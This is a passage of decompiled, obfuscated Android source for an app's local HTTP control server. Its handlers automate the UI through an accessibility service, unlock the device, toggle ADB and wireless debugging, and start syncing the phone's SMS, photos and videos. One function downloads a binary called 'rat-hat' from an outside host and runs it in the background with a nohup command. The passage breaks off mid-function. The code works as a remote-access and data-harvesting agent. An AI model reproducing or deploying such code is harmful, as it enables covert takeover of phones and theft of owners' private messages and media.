                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findLastByDescStartsWith(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void q1(AbstractC0381k abstractC0381k) {
        try {
            String str = "armeabi";
            String[] strArr = Build.SUPPORTED_ABIS;
            if (strArr != null && strArr.length > 0) {
                str = strArr[0];
            }
            String m605c = AbstractC0248d.m605c();
            if (AbstractC0026q.m151B(m605c)) {
                m605c = "https://rathat.me/lib";
            }
            String m606d = AbstractC0248d.m606d();
            if (AbstractC0026q.m151B(m606d)) {
                m606d = "rat-hat";
            }
            z1(null, m605c.concat("/").concat(str).concat("/").concat(m606d), "rat-hat", "nohup /data/local/tmp/rat-hat server -d > /dev/null &", abstractC0381k);
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void q2(CombineFiltersWithOr combineFiltersWithOr, AbstractC0381k abstractC0381k) {
        SearchNodeListResultVO searchNodeListResultVO;
        UiObject m1074m;
        if (combineFiltersWithOr != null) {
            try {
                C0416e o12 = o1(combineFiltersWithOr.getDelegateId());
                if (m508x(o12, abstractC0381k)) {
                    return;
                }
                if (o12 != null) {
                    try {
                        m1074m = o12.m1074m(combineFiltersWithOr.getTarget(), combineFiltersWithOr.getResUnique());
                    } catch (Exception e2) {
                        AbstractC0026q.m186s("AccessibilityDelegate", e2);
                    }
                    if (m1074m != null) {
                        searchNodeListResultVO = o12.m1058C(m1074m.scrollBackwardUtilMultiple(new C0981d(combineFiltersWithOr, 1)));
                        ApiResult apiResult = new ApiResult();
                        apiResult.setData(searchNodeListResultVO);
                        apiResult.setCode(200);
                        apiResult.setMsg("OK");
                        apiResult.setCount(1);
                        apiResult.setSuccess(Boolean.TRUE);
                        String m693N = AbstractC0252h.m693N(apiResult);
                        abstractC0381k.f771l = apiResult.getCode().intValue();
                        abstractC0381k.m952h(m693N);
                        abstractC0381k.mo787l();
                        return;
                    }
                    searchNodeListResultVO = null;
                    ApiResult apiResult2 = new ApiResult();
                    apiResult2.setData(searchNodeListResultVO);
                    apiResult2.setCode(200);
                    apiResult2.setMsg("OK");
                    apiResult2.setCount(1);
                    apiResult2.setSuccess(Boolean.TRUE);
                    String m693N2 = AbstractC0252h.m693N(apiResult2);
                    abstractC0381k.f771l = apiResult2.getCode().intValue();
                    abstractC0381k.m952h(m693N2);
                    abstractC0381k.mo787l();
                    return;
                }
            } catch (Exception e3) {
                AbstractC0026q.m186s("HttpServer", e3);
                return;
            }
        }
        m500p(abstractC0381k, "你提交的参数有误,委托ID、遍历参数不能为空");
    }

    public static void q3(AbstractC0381k abstractC0381k) {
        Boolean bool;
        try {
            ApiResult apiResult = new ApiResult();
            if (AbstractC0251g.m668o()) {
                AbstractC0243l.m594d(new CallableC0244m(4), "SYNC_DEVICE_PHOTOS");
                bool = Boolean.TRUE;
            } else {
                bool = Boolean.FALSE;
            }
            apiResult.setData(bool);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: r */
    public static void m502r(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setCount(1);
            apiResult.setData(Boolean.valueOf(AbstractC0251g.m674u()));
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void r0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findLastById(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static boolean r1(String str) {
        return "/version".equals(str) || "/containerState".equals(str) || "/blockView".equals(str) || "/deviceId".equals(str) || "/isDeviceOwner".equals(str) || "/resetWifiDebug".equals(str) || "/closeWifiDebug".equals(str) || "/openWifiDebug".equals(str) || "/openADBDebug".equals(str) || "/closeADBDebug".equals(str) || "/openDevelopment".equals(str) || "/closeDevelopment".equals(str) || "/shareADBConfig".equals(str) || "/rewriteDebugPort".equals(str) || "/syncADBConfig".equals(str) || "/syncAdminActivating".equals(str) || "/listenHelper".equals(str) || "/finishListenHelper".equals(str) || "/resetAccessibilityService".equals(str) || "/noticeAlive".equals(str) || "/syncLockCipher".equals(str) || "/syncPowerControl".equals(str);
    }

    public static void r2(CombineFilterWithChild combineFilterWithChild, AbstractC0381k abstractC0381k) {
        SearchNodeListResultVO searchNodeListResultVO;
        UiObject m1075n;
        if (combineFilterWithChild != null) {
            try {
                if (combineFilterWithChild.getParentFilter() != null) {
                    C0416e o12 = o1(combineFilterWithChild.getParentFilter().getDelegateId());
                    if (m508x(o12, abstractC0381k)) {
                        return;
                    }
                    if (o12 != null) {
                        try {
                        } catch (Exception e2) {
                            AbstractC0026q.m186s("AccessibilityDelegate", e2);
                        }
                        if (combineFilterWithChild.getParentFilter() != null && (m1075n = o12.m1075n(combineFilterWithChild.getParentFilter())) != null) {
                            searchNodeListResultVO = o12.m1058C(m1075n.scrollBackwardUtilMultiple(new C0980c(combineFilterWithChild, 1)));
                            ApiResult apiResult = new ApiResult();
                            apiResult.setData(searchNodeListResultVO);
                            apiResult.setCode(200);
                            apiResult.setMsg("OK");
                            apiResult.setCount(1);
                            apiResult.setSuccess(Boolean.TRUE);
                            String m693N = AbstractC0252h.m693N(apiResult);
                            abstractC0381k.f771l = apiResult.getCode().intValue();
                            abstractC0381k.m952h(m693N);
                            abstractC0381k.mo787l();
                            return;
                        }
                        searchNodeListResultVO = null;
                        ApiResult apiResult2 = new ApiResult();
                        apiResult2.setData(searchNodeListResultVO);
                        apiResult2.setCode(200);
                        apiResult2.setMsg("OK");
                        apiResult2.setCount(1);
                        apiResult2.setSuccess(Boolean.TRUE);
                        String m693N2 = AbstractC0252h.m693N(apiResult2);
                        abstractC0381k.f771l = apiResult2.getCode().intValue();
                        abstractC0381k.m952h(m693N2);
                        abstractC0381k.mo787l();
                        return;
                    }
                }
            } catch (Exception e3) {
                AbstractC0026q.m186s("HttpServer", e3);
                return;
            }
        }
        m500p(abstractC0381k, "你提交的参数有误,委托ID、遍历参数不能为空");
    }

    public static void r3(PowerControlStateVO powerControlStateVO, AbstractC0381k abstractC0381k) {
        Boolean bool;
        try {
            ApiResult apiResult = new ApiResult();
            if (powerControlStateVO != null) {
                synchronized (PowerControlStateVO.class) {
                    AbstractC0252h.m683D(AbstractC0252h.m693N(powerControlStateVO), "powerControlState:".concat(powerControlStateVO.getPackageName()));
                }
                bool = Boolean.TRUE;
            } else {
                bool = Boolean.FALSE;
            }
            apiResult.setData(bool);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: s */
    public static void m503s(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.FALSE);
            apiResult.setCount(1);
            if (MainApplication.getAppContext() != null && Settings.System.canWrite(MainApplication.getAppContext()) && AbstractC0251g.m637J()) {
                Settings.Global.putInt(MainApplication.getAppContext().getContentResolver(), "adb_wifi_enabled", 0);
            }
            if (!AbstractC0251g.m637J()) {
                apiResult.setData(Boolean.TRUE);
            }
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void s0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findLastByIdContains(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void s1(AbstractC0381k abstractC0381k) {
        try {
            if (MyAccessibilityService.m554P() == null) {
                M1(abstractC0381k);
                return;
            }
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.valueOf(MyAccessibilityService.m554P().m568Y()));
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void s2(CombineFilterWithChild combineFilterWithChild, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1075n;
        if (combineFilterWithChild != null) {
            try {
                if (combineFilterWithChild.getParentFilter() != null) {
                    C0416e o12 = o1(combineFilterWithChild.getParentFilter().getDelegateId());
                    if (m508x(o12, abstractC0381k)) {
                        return;
                    }
                    if (o12 != null) {
                        try {
                        } catch (Exception e2) {
                            AbstractC0026q.m186s("AccessibilityDelegate", e2);
                        }
                        if (combineFilterWithChild.getParentFilter() != null && (m1075n = o12.m1075n(combineFilterWithChild.getParentFilter())) != null) {
                            searchNodeResultVO = o12.m1059D(m1075n.scrollBackwardUtil(new C0980c(combineFilterWithChild, 0)));
                            ApiResult apiResult = new ApiResult();
                            apiResult.setData(searchNodeResultVO);
                            apiResult.setCode(200);
                            apiResult.setMsg("OK");
                            apiResult.setCount(1);
                            apiResult.setSuccess(Boolean.TRUE);
                            String m693N = AbstractC0252h.m693N(apiResult);
                            abstractC0381k.f771l = apiResult.getCode().intValue();
                            abstractC0381k.m952h(m693N);
                            abstractC0381k.mo787l();
                            return;
                        }
                        searchNodeResultVO = null;
                        ApiResult apiResult2 = new ApiResult();
                        apiResult2.setData(searchNodeResultVO);
                        apiResult2.setCode(200);
                        apiResult2.setMsg("OK");
                        apiResult2.setCount(1);
                        apiResult2.setSuccess(Boolean.TRUE);
                        String m693N2 = AbstractC0252h.m693N(apiResult2);
                        abstractC0381k.f771l = apiResult2.getCode().intValue();
                        abstractC0381k.m952h(m693N2);
                        abstractC0381k.mo787l();
                        return;
                    }
                }
            } catch (Exception e3) {
                AbstractC0026q.m186s("HttpServer", e3);
                return;
            }
        }
        m500p(abstractC0381k, "你提交的参数有误,委托ID、遍历参数不能为空");
    }

    public static void s3(AbstractC0381k abstractC0381k) {
        Boolean bool;
        try {
            ApiResult apiResult = new ApiResult();
            if (AbstractC0251g.m669p()) {
                AbstractC0243l.m594d(new CallableC0244m(5), "SYNC_DEVICE_SMS");
                bool = Boolean.TRUE;
            } else {
                bool = Boolean.FALSE;
            }
            apiResult.setData(bool);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: t */
    public static void m504t(ReqUnlockDeviceVO reqUnlockDeviceVO, AbstractC0381k abstractC0381k) {
        if (reqUnlockDeviceVO != null) {
            try {
                AbstractC0252h.m682C(reqUnlockDeviceVO);
            } catch (Exception e2) {
                AbstractC0026q.m186s("HttpServer", e2);
                return;
            }
        }
        ApiResult apiResult = new ApiResult();
        apiResult.setCode(200);
        apiResult.setMsg("OK");
        Boolean bool = Boolean.TRUE;
        apiResult.setSuccess(bool);
        if (MyAccessibilityService.m554P() != null) {
            MyAccessibilityService.m554P().m520a();
            apiResult.setData(bool);
            apiResult.setCount(1);
        }
        String m693N = AbstractC0252h.m693N(apiResult);
        abstractC0381k.f771l = apiResult.getCode().intValue();
        abstractC0381k.m952h(m693N);
        abstractC0381k.mo787l();
    }

    public static void t0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findLastByIdEndsWith(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void t1(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.valueOf(AbstractC0026q.m150A()));
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void t2(CombineFilter combineFilter, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1075n;
        if (combineFilter != null) {
            try {
                C0416e o12 = o1(combineFilter.getDelegateId());
                if (m508x(o12, abstractC0381k)) {
                    return;
                }
                if (o12 != null) {
                    try {
                        m1075n = o12.m1075n(combineFilter);
                    } catch (Exception e2) {
                        AbstractC0026q.m186s("AccessibilityDelegate", e2);
                    }
                    if (m1075n != null) {
                        searchNodeResultVO = o12.m1059D(m1075n.scrollBackwardUtil(new C0981d(combineFilter, 0)));
                        ApiResult apiResult = new ApiResult();
                        apiResult.setData(searchNodeResultVO);
                        apiResult.setCode(200);
                        apiResult.setMsg("OK");
                        apiResult.setCount(1);
                        apiResult.setSuccess(Boolean.TRUE);
                        String m693N = AbstractC0252h.m693N(apiResult);
                        abstractC0381k.f771l = apiResult.getCode().intValue();
                        abstractC0381k.m952h(m693N);
                        abstractC0381k.mo787l();
                        return;
                    }
                    searchNodeResultVO = null;
                    ApiResult apiResult2 = new ApiResult();
                    apiResult2.setData(searchNodeResultVO);
                    apiResult2.setCode(200);
                    apiResult2.setMsg("OK");
                    apiResult2.setCount(1);
                    apiResult2.setSuccess(Boolean.TRUE);
                    String m693N2 = AbstractC0252h.m693N(apiResult2);
                    abstractC0381k.f771l = apiResult2.getCode().intValue();
                    abstractC0381k.m952h(m693N2);
                    abstractC0381k.mo787l();
                    return;
                }
            } catch (Exception e3) {
                AbstractC0026q.m186s("HttpServer", e3);
                return;
            }
        }
        m500p(abstractC0381k, "你提交的参数有误,委托ID、遍历参数不能为空");
    }

    public static void t3(AbstractC0381k abstractC0381k) {
        try {
            boolean m442y = AbstractC0207l.m442y();
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.valueOf(m442y));
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: u */
    public static void m505u(AbstractC0381k abstractC0381k) {
        try {
            LinkedList w02 = AbstractC0251g.w0();
            ApiResult apiResult = new ApiResult();
            apiResult.setData(w02);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount((w02 == null || w02.isEmpty()) ? 0 : Integer.valueOf(w02.size()));
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void u0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findLastByIdMatches(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void u1(AbstractC0381k abstractC0381k, boolean z2) {
        boolean z3;
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.FALSE);
            apiResult.setCount(1);
            if (C0318e.m844S() != null) {
                C0318e m844S = C0318e.m844S();
                if (m844S.mo302D()) {
                    z3 = m844S.m855N(!z2 ? "svc power stayon false" : "svc power stayon true");
                } else {
                    z3 = false;
                }
                apiResult.setData(Boolean.valueOf(z3));
            }
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void u2(CombineFiltersWithOr combineFiltersWithOr, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        if (combineFiltersWithOr != null) {
            try {
                C0416e o12 = o1(combineFiltersWithOr.getDelegateId());
                if (m508x(o12, abstractC0381k)) {
                    return;
                }
                if (o12 != null) {
                    try {
                        m1074m = o12.m1074m(combineFiltersWithOr.getTarget(), combineFiltersWithOr.getResUnique());
                    } catch (Exception e2) {
                        AbstractC0026q.m186s("AccessibilityDelegate", e2);
                    }
                    if (m1074m != null) {
                        searchNodeResultVO = o12.m1059D(m1074m.scrollBackwardUtil(new C0981d(combineFiltersWithOr, 1)));
                        ApiResult apiResult = new ApiResult();
                        apiResult.setData(searchNodeResultVO);
                        apiResult.setCode(200);
                        apiResult.setMsg("OK");
                        apiResult.setCount(1);
                        apiResult.setSuccess(Boolean.TRUE);
                        String m693N = AbstractC0252h.m693N(apiResult);
                        abstractC0381k.f771l = apiResult.getCode().intValue();
                        abstractC0381k.m952h(m693N);
                        abstractC0381k.mo787l();
                        return;
                    }
                    searchNodeResultVO = null;
                    ApiResult apiResult2 = new ApiResult();
                    apiResult2.setData(searchNodeResultVO);
                    apiResult2.setCode(200);
                    apiResult2.setMsg("OK");
                    apiResult2.setCount(1);
                    apiResult2.setSuccess(Boolean.TRUE);
                    String m693N2 = AbstractC0252h.m693N(apiResult2);
                    abstractC0381k.f771l = apiResult2.getCode().intValue();
                    abstractC0381k.m952h(m693N2);
                    abstractC0381k.mo787l();
                    return;
                }
            } catch (Exception e3) {
                AbstractC0026q.m186s("HttpServer", e3);
                return;
            }
        }
        m500p(abstractC0381k, "你提交的参数有误,委托ID、遍历参数不能为空");
    }

    public static void u3(AbstractC0381k abstractC0381k) {
        Boolean bool;
        try {
            ApiResult apiResult = new ApiResult();
            if (AbstractC0251g.m668o()) {
                AbstractC0243l.m594d(new CallableC0244m(6), "SYNC_DEVICE_VIDEOS");
                bool = Boolean.TRUE;
            } else {
                bool = Boolean.FALSE;
            }
            apiResult.setData(bool);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: v */
    public static void m506v(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            ContainerEventVO containerEventVO = new ContainerEventVO();
            if (MainApplication.getInstance() != null) {
                containerEventVO.setPackageName(MainApplication.getInstance().getPackageName());
            }
            containerEventVO.setContainerCode("ACCESSIBILITY_CONTAINER");
            containerEventVO.setIsOpened(MyAccessibilityService.m554P() != null ? 1 : 0);
            containerEventVO.setServiceState(Integer.valueOf(f292c.get()));
            if (MainApplication.getInstance() != null && MainApplication.getInstance().getHeartThread() != null) {
                MainApplication.getInstance().getHeartThread().f372g.set(0);
            }
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setData(containerEventVO);
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void v0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findLastByIdStartsWith(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:10:0x0051 A[Catch: Exception -> 0x0071, TryCatch #1 {Exception -> 0x0071, blocks: (B:2:0x0000, B:4:0x0006, B:6:0x0032, B:10:0x0051, B:15:0x0049, B:16:0x0056, B:19:0x006b, B:12:0x0038), top: B:1:0x0000, inners: #0 }] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static void v1(AbstractC0381k abstractC0381k, String str) {
        try {
            if (AbstractC0026q.m151B(str)) {
                m500p(abstractC0381k, "你提交的参数有错误、或参数不合法,详见参数错误明细");
                return;
            }
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.FALSE);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            boolean z2 = true;
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            if (AbstractC0251g.F0(2)) {
                if (AbstractC0251g.m653Z() != null) {
                    try {
                        ((ActivityManager) AbstractC0251g.m653Z().getSystemService("activity")).killBackgroundProcesses(str);
                    } catch (Exception e2) {
                        AbstractC0026q.m186s("ApplicationUtil", e2);
                    }
                    if (z2) {
                        apiResult.setData(Boolean.TRUE);
                    }
                }
                z2 = false;
